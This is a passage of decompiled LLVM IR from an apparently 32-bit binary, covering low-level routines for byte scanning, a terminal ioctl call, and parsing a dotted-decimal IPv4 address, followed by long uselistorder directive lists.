dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a24
  %v2_15a34 = icmp eq i8 %v3_15a24, 0
  br i1 %v2_15a34, label %dec_label_pc_15a6c, label %dec_label_pc_15a3c

dec_label_pc_15a3c:                               ; preds = %dec_label_pc_15a34
  %v1_15a3c = add i32 %v0_15a2c, 2
  %v2_15a3c = inttoptr i32 %v1_15a3c to i8*
  %v3_15a3c = load i8, i8* %v2_15a3c, align 1
  %v4_15a3c = zext i8 %v3_15a3c to i32
  %v9_15a40 = icmp eq i32 %v4_15a3c, %v1_15994
  br i1 %v9_15a40, label %dec_label_pc_15a6c, label %dec_label_pc_15a4c

dec_label_pc_15a4c:                               ; preds = %dec_label_pc_15a3c
  %v2_15a4c = icmp eq i8 %v3_15a3c, 0
  br i1 %v2_15a4c, label %dec_label_pc_15a6c, label %dec_label_pc_15a54

dec_label_pc_15a54:                               ; preds = %dec_label_pc_15a4c
  %v1_15a54 = add i32 %v0_15a2c, 3
  %v2_15a54 = inttoptr i32 %v1_15a54 to i8*
  %v3_15a54 = load i8, i8* %v2_15a54, align 1
  %v4_15a54 = zext i8 %v3_15a54 to i32
  %v9_15a58 = icmp eq i32 %v4_15a54, %v1_15994
  br i1 %v9_15a58, label %dec_label_pc_15a6c, label %dec_label_pc_15a64

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15a54
  %v2_15a64 = icmp eq i8 %v3_15a54, 0
  br i1 %v2_15a64, label %dec_label_pc_15a6c, label %dec_label_pc_159c8

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_159a8, %dec_label_pc_1599c, %dec_label_pc_15a64, %dec_label_pc_15a54, %dec_label_pc_15a4c, %dec_label_pc_15a3c, %dec_label_pc_15a34, %dec_label_pc_15a24, %dec_label_pc_15a1c, %dec_label_pc_15a0c
  %v1_15a70 = phi i32 [ %v1_15a54, %dec_label_pc_15a64 ], [ %v1_15a54, %dec_label_pc_15a54 ], [ %v1_15a3c, %dec_label_pc_15a4c ], [ %v1_15a3c, %dec_label_pc_15a3c ], [ %v1_15a24, %dec_label_pc_15a34 ], [ %v1_15a24, %dec_label_pc_15a24 ], [ %v0_15a2c, %dec_label_pc_15a1c ], [ %v0_15a2c, %dec_label_pc_15a0c ], [ %v0_159b0, %dec_label_pc_1599c ], [ %v0_159b0, %dec_label_pc_159a8 ]
  ret i32 %v1_15a70

; uselistorder directives
  uselistorder i32 %v4_159c8, { 1, 0 }
  uselistorder i32 %v2_159c8, { 0, 2, 1 }
  uselistorder i32 %v0_15a2c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_159bc, { 1, 0 }
  uselistorder i32 %v1_159b0, { 1, 0, 2 }
  uselistorder i32 %v0_159b42, { 2, 1, 0 }
  uselistorder i32 %v1_15994, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15a6c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_15a0c, { 1, 0 }
  uselistorder label %dec_label_pc_1599c, { 1, 0 }
}

define i32 @function_15a7c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15a7c:
  %v1_15a80 = urem i32 %arg1, 256
  %v0_15aa03 = load i32, i32* @r0, align 4
  %v1_15aa04 = urem i32 %v0_15aa03, 4
  %v2_15aa05 = icmp eq i32 %v1_15aa04, 0
  br i1 %v2_15aa05, label %dec_label_pc_15aa8, label %dec_label_pc_15a88

dec_label_pc_15a88:                               ; preds = %dec_label_pc_15a7c, %dec_label_pc_15a9c
  %v0_15a9c = phi i32 [ %v1_15a9c, %dec_label_pc_15a9c ], [ %v0_15aa03, %dec_label_pc_15a7c ]
  %v1_15a88 = inttoptr i32 %v0_15a9c to i8*
  %v2_15a88 = load i8, i8* %v1_15a88, align 1
  %v3_15a88 = zext i8 %v2_15a88 to i32
  %v9_15a8c = icmp eq i32 %v3_15a88, %v1_15a80
  br i1 %v9_15a8c, label %dec_label_pc_15b5c, label %dec_label_pc_15a94

dec_label_pc_15a94:                               ; preds = %dec_label_pc_15a88
  %v2_15a94 = icmp eq i8 %v2_15a88, 0
  br i1 %v2_15a94, label %dec_label_pc_15b58, label %dec_label_pc_15a9c

dec_label_pc_15a9c:                               ; preds = %dec_label_pc_15a94
  %v1_15a9c = add i32 %v0_15a9c, 1
  %v1_15aa0 = urem i32 %v1_15a9c, 4
  %v2_15aa0 = icmp eq i32 %v1_15aa0, 0
  br i1 %v2_15aa0, label %dec_label_pc_15aa8, label %dec_label_pc_15a88

dec_label_pc_15aa8:                               ; preds = %dec_label_pc_15a9c, %dec_label_pc_15a7c
  %v0_15aac = phi i32 [ %v0_15aa03, %dec_label_pc_15a7c ], [ %v1_15a9c, %dec_label_pc_15a9c ]
  %v4_15aa8 = mul nuw nsw i32 %v1_15a80, 256
  %v5_15aa8 = or i32 %v4_15aa8, %v1_15a80
  %v4_15ab0 = mul i32 %v5_15aa8, 65536
  %v5_15ab0 = or i32 %v4_15ab0, %v5_15aa8
  br label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %dec_label_pc_15b50, %dec_label_pc_15af0, %dec_label_pc_15aa8
  %v0_15b18 = phi i32 [ %v0_15aac, %dec_label_pc_15aa8 ], [ %v4_15ab4, %dec_label_pc_15af0 ], [ %v4_15ab4, %dec_label_pc_15b50 ]
  %v1_15ab4 = inttoptr i32 %v0_15b18 to i32*
  %v2_15ab4 = load i32, i32* %v1_15ab4, align 4
  %v4_15ab4 = add i32 %v0_15b18, 4
  %v2_15abc = xor i32 %v2_15ab4, %v5_15ab0
  %v2_15ac0 = add i32 %v2_15abc, 2130640639
  store i32 %v2_15ac0, i32* @ip, align 4
  %v2_15ac8 = add i32 %v2_15ab4, 2130640639
  %v1_15acc = sub i32 -1, %v2_15ab4
  %v2_15ad0 = xor i32 %v2_15ac8, %v1_15acc
  %v2_15adc = and i32 %v2_15ad0, -2130640640
  %v2_15ae4 = icmp eq i32 %v2_15adc, 0
  br i1 %v2_15ae4, label %dec_label_pc_15af0, label %dec_label_pc_15af8

dec_label_pc_15af0:                               ; preds = %dec_label_pc_15ab4
  %v1_15ad8 = sub i32 -1, %v2_15abc
  %v2_15ae0 = xor i32 %v2_15ac0, %v1_15ad8
  %v2_15ae8 = and i32 %v2_15ae0, -2130640640
  %v2_15af0 = icmp eq i32 %v2_15ae8, 0
  br i1 %v2_15af0, label %dec_label_pc_15ab4, label %dec_label_pc_15af8

dec_label_pc_15af8:                               ; preds = %dec_label_pc_15ab4, %dec_label_pc_15af0
  %v2_15af8 = inttoptr i32 %v0_15b18 to i8*
  %v3_15af8 = load i8, i8* %v2_15af8, align 1
  %v4_15af8 = zext i8 %v3_15af8 to i32
  %v9_15afc = icmp eq i32 %v4_15af8, %v1_15a80
  br i1 %v9_15afc, label %dec_label_pc_15b5c, label %dec_label_pc_15b08

dec_label_pc_15b08:                               ; preds = %dec_label_pc_15af8
  %v2_15b08 = icmp eq i8 %v3_15af8, 0
  br i1 %v2_15b08, label %dec_label_pc_15b58, label %dec_label_pc_15b10

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15b08
  %v1_15b10 = add i32 %v0_15b18, 1
  %v2_15b10 = inttoptr i32 %v1_15b10 to i8*
  %v3_15b10 = load i8, i8* %v2_15b10, align 1
  %v4_15b10 = zext i8 %v3_15b10 to i32
  %v9_15b14 = icmp eq i32 %v4_15b10, %v1_15a80
  br i1 %v9_15b14, label %dec_label_pc_15b5c, label %dec_label_pc_15b20

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15b10
  %v2_15b20 = icmp eq i8 %v3_15b10, 0
  br i1 %v2_15b20, label %dec_label_pc_15b58, label %dec_label_pc_15b28

dec_label_pc_15b28:                               ; preds = %dec_label_pc_15b20
  %v1_15b28 = add i32 %v0_15b18, 2
  %v2_15b28 = inttoptr i32 %v1_15b28 to i8*
  %v3_15b28 = load i8, i8* %v2_15b28, align 1
  %v4_15b28 = zext i8 %v3_15b28 to i32
  %v9_15b2c = icmp eq i32 %v4_15b28, %v1_15a80
  br i1 %v9_15b2c, label %dec_label_pc_15b5c, label %dec_label_pc_15b38

dec_label_pc_15b38:                               ; preds = %dec_label_pc_15b28
  %v2_15b38 = icmp eq i8 %v3_15b28, 0
  br i1 %v2_15b38, label %dec_label_pc_15b58, label %dec_label_pc_15b40

dec_label_pc_15b40:                               ; preds = %dec_label_pc_15b38
  %v1_15b40 = add i32 %v0_15b18, 3
  %v2_15b40 = inttoptr i32 %v1_15b40 to i8*
  %v3_15b40 = load i8, i8* %v2_15b40, align 1
  %v4_15b40 = zext i8 %v3_15b40 to i32
  %v9_15b44 = icmp eq i32 %v4_15b40, %v1_15a80
  br i1 %v9_15b44, label %dec_label_pc_15b5c, label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15b40
  %v2_15b50 = icmp eq i8 %v3_15b40, 0
  br i1 %v2_15b50, label %dec_label_pc_15b58, label %dec_label_pc_15ab4

dec_label_pc_15b58:                               ; preds = %dec_label_pc_15a94, %dec_label_pc_15b50, %dec_label_pc_15b38, %dec_label_pc_15b20, %dec_label_pc_15b08
  br label %dec_label_pc_15b5c

dec_label_pc_15b5c:                               ; preds = %dec_label_pc_15a88, %dec_label_pc_15b40, %dec_label_pc_15b28, %dec_label_pc_15b10, %dec_label_pc_15af8, %dec_label_pc_15b58
  %v1_15b60 = phi i32 [ 0, %dec_label_pc_15b58 ], [ %v1_15b40, %dec_label_pc_15b40 ], [ %v1_15b28, %dec_label_pc_15b28 ], [ %v1_15b10, %dec_label_pc_15b10 ], [ %v0_15b18, %dec_label_pc_15af8 ], [ %v0_15a9c, %dec_label_pc_15a88 ]
  ret i32 %v1_15b60

; uselistorder directives
  uselistorder i32 %v4_15ab4, { 1, 0 }
  uselistorder i32 %v2_15ab4, { 0, 2, 1 }
  uselistorder i32 %v0_15b18, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15aa8, { 1, 0 }
  uselistorder i32 %v1_15a9c, { 1, 0, 2 }
  uselistorder i32 %v0_15aa03, { 2, 1, 0 }
  uselistorder i32 %v1_15a80, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 3, { 3, 4, 1, 5, 62, 63, 111, 64, 65, 66, 67, 68, 69, 71, 72, 112, 7, 105, 29, 106, 28, 107, 42, 108, 70, 43, 78, 30, 73, 74, 2, 75, 76, 77, 44, 8, 79, 31, 80, 45, 81, 46, 82, 47, 32, 48, 49, 0, 83, 84, 50, 10, 9, 51, 86, 33, 87, 12, 11, 52, 34, 88, 14, 13, 53, 89, 35, 90, 91, 16, 15, 54, 92, 36, 93, 18, 17, 55, 94, 37, 95, 57, 96, 20, 19, 56, 97, 38, 98, 59, 99, 22, 21, 58, 100, 39, 101, 24, 23, 60, 102, 40, 103, 26, 25, 61, 109, 41, 110, 27, 104, 6, 85 }
  uselistorder i32 2130640639, { 0, 2, 1, 3 }
  uselistorder i32 65536, { 4, 5, 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 142, 143, 141, 147, 26, 27, 28, 29, 30, 31, 32, 33, 140, 34, 35, 36, 2, 37, 0, 3, 38, 39, 41, 40, 1, 44, 42, 43, 45, 50, 46, 51, 47, 52, 48, 49, 53, 54, 55, 56, 58, 59, 57, 139, 61, 60, 64, 65, 66, 62, 63, 69, 67, 70, 68, 71, 72, 73, 74, 75, 77, 78, 76, 79, 144, 81, 80, 84, 85, 86, 82, 83, 87, 88, 90, 91, 92, 89, 93, 145, 94, 96, 95, 98, 97, 99, 146, 100, 102, 101, 104, 103, 106, 107, 105, 108, 109, 116, 110, 117, 111, 118, 112, 119, 113, 120, 114, 115, 122, 121, 123, 124, 125, 126, 131, 127, 132, 128, 133, 129, 130, 135, 134, 136, 137, 138 }
  uselistorder label %dec_label_pc_15b5c, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15b58, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15af8, { 1, 0 }
  uselistorder label %dec_label_pc_15a88, { 1, 0 }
}

define i32 @function_15b6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b6c:
  %stack_var_-68 = alloca i32, align 4
  %v2_15b74 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15b74, i32* @r1, align 4
  %v0_15b78 = call i32 @function_15b90()
  %v1_15b7c = sub i32 1, %v0_15b78
  %v2_15b7c = icmp ult i32 %v0_15b78, 2
  br i1 %v2_15b7c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_15b6c
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_15b6c, %bb
  %v1_15b8c = phi i32 [ %v1_15b7c, %dec_label_pc_15b6c ], [ 0, %bb ]
  ret i32 %v1_15b8c

; uselistorder directives
  uselistorder i32 %v0_15b78, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_15b90() local_unnamed_addr {
dec_label_pc_15b90:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_15b90 = load i32, i32* @r4, align 4
  %v6_15b90 = load i32, i32* @r5, align 4
  %v2_15b98 = ptrtoint i32* %stack_var_-52 to i32
  %v0_15b9c = load i32, i32* @r1, align 4
  store i32 %v0_15b9c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_15ba8 = load i32, i32* @r0, align 4
  %v3_15ba8 = call i32 @function_10d4c(i32 %v0_15ba8, i32 21505, i32 %v2_15b98)
  store i32 %v3_15ba8, i32* %r0.global-to-local, align 4
  store i32 %v3_15ba8, i32* @r5, align 4
  %v2_15bac = icmp eq i32 %v3_15ba8, 0
  br i1 %v2_15bac, label %dec_label_pc_15bb4, label %dec_label_pc_15bf8

dec_label_pc_15bb4:                               ; preds = %dec_label_pc_15b90
  %v4_15bc0 = zext i8 %tmp to i32
  store i32 %v4_15bc0, i32* @ip, align 4
  %v3_15bc4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_15bc4, i32* @r3, align 4
  %v1_15bc8 = load i32, i32* @r4, align 4
  %v2_15bc8 = add i32 %v1_15bc8, 4
  %v3_15bc8 = inttoptr i32 %v2_15bc8 to i32*
  %v0_15bcc = load i32, i32* %r1.global-to-local, align 4
  %v1_15bcc = load i32, i32* @r4, align 4
  %v2_15bcc = add i32 %v1_15bcc, 8
  %v3_15bcc = inttoptr i32 %v2_15bcc to i32*
  store i32 %v0_15bcc, i32* %v3_15bcc, align 4
  %v0_15bd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_15bd0 = load i32, i32* @r4, align 4
  %v2_15bd0 = add i32 %v1_15bd0, 12
  %v3_15bd0 = inttoptr i32 %v2_15bd0 to i32*
  store i32 %v0_15bd0, i32* %v3_15bd0, align 4
  %v2_15bd4 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_15bd4, i32* @r1, align 4
  %v1_15bdc = load i32, i32* @r4, align 4
  %v2_15bdc = inttoptr i32 %v1_15bdc to i32*
  store i32 %v3_15bc4, i32* %v2_15bdc, align 4
  %v0_15be0 = load i32, i32* @ip, align 4
  %v1_15be0 = trunc i32 %v0_15be0 to i8
  %v2_15be0 = load i32, i32* @r4, align 4
  %v3_15be0 = add i32 %v2_15be0, 16
  %v4_15be0 = inttoptr i32 %v3_15be0 to i8*
  store i8 %v1_15be0, i8* %v4_15be0, align 1
  %v0_15be4 = load i32, i32* @r4, align 4
  %v1_15be4 = add i32 %v0_15be4, 17
  store i32 %v1_15be4, i32* %r0.global-to-local, align 4
  %v4_15be8 = call i32 @function_160d4(i32 %v1_15be4, i32 %v2_15bd4, i32 19, i32 %v3_15bc4)
  store i32 %v4_15be8, i32* %r0.global-to-local, align 4
  %v0_15bec = load i32, i32* @r5, align 4
  store i32 %v0_15bec, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_15bf4 = inttoptr i32 %v4_15be8 to i8*
  %v3_15bf4 = call i32 @function_11250(i8* %v2_15bf4, i32 %v0_15bec)
  store i32 %v3_15bf4, i32* %r0.global-to-local, align 4
  %v0_15bf8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15bf8

dec_label_pc_15bf8:                               ; preds = %dec_label_pc_15b90, %dec_label_pc_15bb4
  %v0_15bf8 = phi i32 [ %v3_15ba8, %dec_label_pc_15b90 ], [ %v0_15bf8.pre, %dec_label_pc_15bb4 ]
  store i32 %v0_15bf8, i32* %r0.global-to-local, align 4
  store i32 %v3_15b90, i32* @r4, align 4
  store i32 %v6_15b90, i32* @r5, align 4
  ret i32 %v0_15bf8

; uselistorder directives
  uselistorder i32 %v0_15bf8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i8*, i32)* @function_11250, { 2, 3, 4, 8, 0, 1, 11, 10, 9, 5, 6, 7 }
  uselistorder i32 13, { 9, 8, 0, 1, 5, 11, 12, 13, 10, 14, 15, 2, 16, 17, 18, 19, 20, 21, 22, 6, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 7, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 3, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 4, 53, 54 }
  uselistorder i32 17, { 16, 1, 4, 17, 18, 5, 19, 6, 7, 8, 9, 10, 11, 20, 12, 21, 13, 22, 23, 14, 24, 15, 2, 25, 3, 26, 27, 28, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10d4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15bf8, { 1, 0 }
}

define i32 @function_15c0c() local_unnamed_addr {
dec_label_pc_15c0c:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15c0c = load i32, i32* @r4, align 4
  store i32 %v3_15c0c, i32* %stack_var_-28, align 4
  %v0_15c14 = load i32, i32* @r0, align 4
  %v2_15c14 = icmp eq i32 %v0_15c14, 0
  %v0_15c1c = load i32, i32* @r1, align 4
  br i1 %v2_15c14, label %dec_label_pc_15cf0, label %dec_label_pc_15c24

dec_label_pc_15c24:                               ; preds = %dec_label_pc_15c0c
  br label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %dec_label_pc_15c24, %dec_label_pc_15cb4
  %v1_15cb4 = phi i32 [ 0, %dec_label_pc_15c24 ], [ %v5_15cb4, %dec_label_pc_15cb4 ]
  %v0_15cb8 = phi i32 [ 1, %dec_label_pc_15c24 ], [ %v1_15cb8, %dec_label_pc_15cb4 ]
  %v0_15c3c = phi i32 [ %v0_15c14, %dec_label_pc_15c24 ], [ %v0_15c3c12, %dec_label_pc_15cb4 ]
  %v1_15c3c = inttoptr i32 %v0_15c3c to i8*
  %v2_15c3c = load i8, i8* %v1_15c3c, align 1
  %v3_15c3c = zext i8 %v2_15c3c to i32
  %v4_15c40 = load i32, i32* inttoptr (i32 125028 to i32*), align 4
  %v2_15c44 = mul nuw nsw i32 %v3_15c3c, 2
  %v2_15c48 = add i32 %v2_15c44, %v4_15c40
  %v3_15c48 = inttoptr i32 %v2_15c48 to i16*
  %v4_15c48 = load i16, i16* %v3_15c48, align 2
  %v1_15c4c = and i16 %v4_15c48, 8
  %v2_15c4c = icmp eq i16 %v1_15c4c, 0
  br i1 %v2_15c4c, label %dec_label_pc_15cf0, label %dec_label_pc_15c54

dec_label_pc_15c54:                               ; preds = %dec_label_pc_15c3c
  br label %dec_label_pc_15c74

dec_label_pc_15c5c:                               ; preds = %dec_label_pc_15c74
  %v2_15c5c = mul i32 %v0_15cb4, 10
  %v1_15c60 = add i32 %v2_15c5c, -48
  %v2_15c64 = add i32 %v3_15c74, %v1_15c60
  %v8_15c6c = icmp sgt i32 %v2_15c64, 255
  br i1 %v8_15c6c, label %dec_label_pc_15cf0, label %dec_label_pc_15c70

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15c5c
  %v1_15c70 = add i32 %v0_15ca4, 1
  store i32 %v1_15c70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15c74

dec_label_pc_15c74:                               ; preds = %dec_label_pc_15c54, %dec_label_pc_15c70
  %v0_15cb4 = phi i32 [ 0, %dec_label_pc_15c54 ], [ %v2_15c64, %dec_label_pc_15c70 ]
  %v0_15ca4 = phi i32 [ %v0_15c3c, %dec_label_pc_15c54 ], [ %v1_15c70, %dec_label_pc_15c70 ]
  %v1_15c74 = inttoptr i32 %v0_15ca4 to i8*
  %v2_15c74 = load i8, i8* %v1_15c74, align 1
  %v3_15c74 = zext i8 %v2_15c74 to i32
  %v2_15c78 = mul nuw nsw i32 %v3_15c74, 2
  %v2_15c7c = add i32 %v2_15c78, %v4_15c40
  %v3_15c7c = inttoptr i32 %v2_15c7c to i16*
  %v4_15c7c = load i16, i16* %v3_15c7c, align 2
  %v6_15c7c = zext i16 %v4_15c7c to i32
  %v1_15c80 = and i32 %v6_15c7c, 8
  %v2_15c80 = icmp eq i32 %v1_15c80, 0
  br i1 %v2_15c80, label %dec_label_pc_15c88, label %dec_label_pc_15c5c

dec_label_pc_15c88:                               ; preds = %dec_label_pc_15c74
  %v7_15c88 = icmp eq i32 %v0_15cb8, 4
  br i1 %v7_15c88, label %dec_label_pc_15ca0, label %dec_label_pc_15c90

dec_label_pc_15c90:                               ; preds = %dec_label_pc_15c88
  %v7_15c90 = icmp eq i8 %v2_15c74, 46
  br i1 %v7_15c90, label %dec_label_pc_15c98, label %dec_label_pc_15cf0

dec_label_pc_15c98:                               ; preds = %dec_label_pc_15c90
  %v1_15c98 = add i32 %v0_15ca4, 1
  store i32 %v1_15c98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cb4

dec_label_pc_15ca0:                               ; preds = %dec_label_pc_15c88
  %v2_15ca0 = icmp eq i8 %v2_15c74, 0
  %v1_15ca4 = add i32 %v0_15ca4, 1
  store i32 %v1_15ca4, i32* %r0.global-to-local, align 4
  br i1 %v2_15ca0, label %dec_label_pc_15cb4, label %dec_label_pc_15cac

dec_label_pc_15cac:                               ; preds = %dec_label_pc_15ca0
  %v1_15cac = and i32 %v6_15c7c, 32
  %v2_15cac = icmp eq i32 %v1_15cac, 0
  br i1 %v2_15cac, label %dec_label_pc_15cf0, label %dec_label_pc_15cb4

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15cac, %dec_label_pc_15ca0, %dec_label_pc_15c98
  %v0_15c3c12 = phi i32 [ %v1_15ca4, %dec_label_pc_15cac ], [ %v1_15ca4, %dec_label_pc_15ca0 ], [ %v1_15c98, %dec_label_pc_15c98 ]
  %v4_15cb4 = mul i32 %v1_15cb4, 256
  %v5_15cb4 = or i32 %v0_15cb4, %v4_15cb4
  %v1_15cb8 = add nuw nsw i32 %v0_15cb8, 1
  %v7_15cc0 = icmp slt i32 %v1_15cb8, 5
  br i1 %v7_15cc0, label %dec_label_pc_15c3c, label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %dec_label_pc_15cb4
  %v2_15cc4 = icmp eq i32 %v0_15c1c, 0
  br i1 %v2_15cc4, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_15cc4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cf4

bb:                                               ; preds = %dec_label_pc_15cc4
  %v4_15cc8 = udiv i32 %v5_15cb4, 16777216
  %v2_15ccc = udiv i32 %v5_15cb4, 256
  %v5_15cd0 = and i32 %v2_15ccc, 65280
  %v2_15cd4 = and i32 %v5_15cb4, 65280
  %v5_15cd8 = mul nuw nsw i32 %v2_15cd4, 256
  %v5_15cdc = mul i32 %v0_15cb4, 16777216
  %v6_15cd0 = or i32 %v4_15cc8, %v5_15cdc
  %v6_15cd8 = or i32 %v6_15cd0, %v5_15cd0
  %v6_15cdc = or i32 %v6_15cd8, %v5_15cd8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_15ce8 = inttoptr i32 %v0_15c1c to i32*
  store i32 %v6_15cdc, i32* %v3_15ce8, align 4
  %v2_15cf4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_15cf8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cf4

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15c90, %dec_label_pc_15cac, %dec_label_pc_15c3c, %dec_label_pc_15c5c, %dec_label_pc_15c0c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cf4

dec_label_pc_15cf4:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_15cf0
  %v1_15cf8 = phi i32 [ %v1_15cf8.pre, %bb ], [ 0, %dec_label_pc_15cf0 ], [ 1, %.thread7.thread ]
  %v2_15cf4 = phi i32 [ %v2_15cf4.pre, %bb ], [ %v3_15c0c, %dec_label_pc_15cf0 ], [ %v3_15c0c, %.thread7.thread ]
  store i32 %v2_15cf4, i32* @r4, align 4
  ret i32 %v1_15cf8

; uselistorder directives
  uselistorder i32 %v1_15cb8, { 1, 0 }
  uselistorder i32 %v5_15cb4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15ca4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 58, 1, 6, 0, 7, 2, 8, 9, 10, 11, 12, 51, 52, 13, 14, 15, 53, 54, 16, 17, 18, 19, 20, 55, 3, 56, 57, 21, 22, 4, 23, 59, 60, 41, 24, 25, 26, 27, 28, 44, 45, 42, 43, 61, 62, 63, 48, 49, 46, 47, 64, 65, 66, 67, 5, 68, 29, 30, 69, 31, 32, 33, 34, 70, 35, 36, 71, 37, 38, 39, 40, 50 }
  uselistorder i32 16777216, { 0, 1, 78, 77, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 27, 26, 28, 29, 30, 31, 33, 32, 35, 34, 37, 36, 38, 39, 42, 40, 43, 41, 44, 45, 46, 48, 47, 49, 50, 51, 52, 53, 54, 57, 55, 58, 56, 59, 60, 62, 61, 63, 64, 66, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 79 }
  uselistorder i32 5, { 14, 0, 45, 4, 25, 26, 15, 24, 2, 1, 27, 28, 16, 17, 18, 19, 20, 29, 21, 33, 5, 34, 6, 35, 7, 36, 22, 8, 37, 9, 38, 39, 10, 40, 41, 11, 42, 12, 43, 13, 46, 3, 44, 30, 23, 31, 32 }
  uselistorder i32 32, { 97, 46, 44, 84, 85, 86, 87, 92, 93, 80, 81, 82, 83, 90, 91, 47, 48, 52, 49, 53, 50, 54, 51, 55, 56, 98, 99, 57, 100, 65, 66, 64, 67, 68, 69, 70, 71, 72, 59, 60, 2, 61, 3, 62, 5, 4, 58, 63, 73, 101, 7, 6, 9, 8, 11, 10, 45, 74, 94, 13, 12, 15, 14, 17, 16, 19, 18, 79, 21, 20, 22, 24, 23, 26, 25, 27, 28, 30, 29, 88, 89, 75, 31, 95, 32, 96, 33, 34, 35, 36, 76, 37, 38, 39, 77, 40, 0, 41, 1, 42, 43, 78 }
  uselistorder i8 0, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 26, 25, 18, 27, 3, 16, 4, 28, 30, 29, 19, 31, 32, 20, 33, 34, 0, 17, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 1, 49, 50, 51, 22, 52, 55, 23, 53, 54, 21, 56, 57, 58, 59, 60, 2, 61, 24, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 5, 14, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i32 10, { 4, 25, 26, 27, 7, 41, 43, 42, 0, 38, 39, 67, 44, 1, 33, 9, 28, 10, 29, 11, 30, 12, 31, 32, 22, 5, 34, 23, 13, 3, 24, 35, 14, 36, 37, 15, 16, 17, 40, 8, 45, 46, 2, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 18, 58, 59, 60, 19, 61, 62, 63, 64, 65, 68, 69, 70, 71, 72, 6, 66, 20, 73, 21 }
  uselistorder i16 0, { 0, 1, 2, 3, 8, 9, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 6, 20, 7, 21, 22, 23 }
  uselistorder i32 2, { 5, 6, 153, 64, 65, 61, 291, 292, 75, 293, 294, 66, 295, 296, 159, 154, 160, 155, 91, 7, 161, 8, 67, 9, 10, 297, 71, 273, 11, 12, 274, 13, 14, 60, 270, 15, 16, 17, 271, 275, 18, 19, 20, 21, 76, 276, 277, 22, 23, 0, 156, 278, 24, 279, 92, 25, 152, 26, 27, 28, 29, 30, 93, 95, 94, 68, 69, 80, 177, 178, 100, 179, 101, 175, 96, 176, 97, 180, 98, 162, 167, 99, 163, 81, 164, 82, 165, 83, 166, 168, 169, 170, 171, 172, 84, 173, 85, 174, 77, 31, 32, 181, 184, 185, 102, 72, 157, 186, 103, 187, 105, 182, 104, 183, 87, 188, 107, 189, 106, 86, 190, 108, 191, 33, 34, 35, 109, 192, 193, 110, 88, 111, 112, 114, 73, 115, 113, 194, 116, 117, 118, 119, 120, 195, 70, 74, 196, 197, 199, 200, 201, 202, 203, 204, 122, 205, 121, 206, 207, 208, 209, 210, 211, 123, 89, 212, 213, 214, 215, 216, 217, 125, 218, 124, 219, 220, 222, 126, 221, 127, 128, 223, 224, 225, 226, 227, 228, 229, 1, 36, 37, 38, 39, 40, 41, 129, 230, 